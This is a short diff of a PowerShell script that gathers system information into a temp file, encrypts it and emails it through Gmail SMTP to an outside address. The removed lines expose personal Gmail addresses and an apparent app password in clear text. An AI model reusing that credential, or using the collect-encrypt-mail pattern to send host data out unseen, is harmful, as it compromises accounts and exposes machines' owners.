@@ -2,12 +2,12 @@
 $OutputFile = "$env:TEMP\sysinfo_report.txt"
 $EncryptedFile = "$env:TEMP\sysinfo_report.txt.enc"
 $SmtpServer = "smtp.gmail.com"                # SMTP server for Gmail
-$From = "ashleylovergirl4@gmail.com"          # Sender's email
-$To = "lefrenchcoooper@gmail.com"             # Recipient's email
+$From = ""          # Sender's email
+$To = ""             # Recipient's email
 $Subject = "System Information Report"
 $Body = "Please find the attached encrypted system information report."
-$Username = "ashleylovergirl4@gmail.com"      # Gmail username
-$Password = "kvzs lioz rlin gnws"             # Gmail App Password (ensure it's a valid App Password)
+$Username = ""      # Gmail username
+$Password = ""      # Gmail App Password (ensure it's a valid App Password)
 
 # Gather basic system information and save to a file
 "System Report - $(Get-Date)" | Out-File -FilePath $OutputFile
